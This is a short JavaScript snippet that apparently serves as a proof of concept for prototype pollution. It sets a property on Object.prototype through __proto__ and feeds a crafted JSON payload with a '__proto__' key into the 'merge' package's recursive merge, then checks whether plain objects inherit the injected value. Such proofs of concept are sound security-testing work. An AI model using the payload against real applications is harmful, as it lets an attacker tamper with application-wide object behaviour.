var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const merge = require('merge');
const payload2 = JSON.parse('{"x": {"__proto__":{"polluted":"yes"}}}');
let obj1 = { x: { y: 1 } };
merge.recursive(obj1, payload2);
console.log({}.polluted);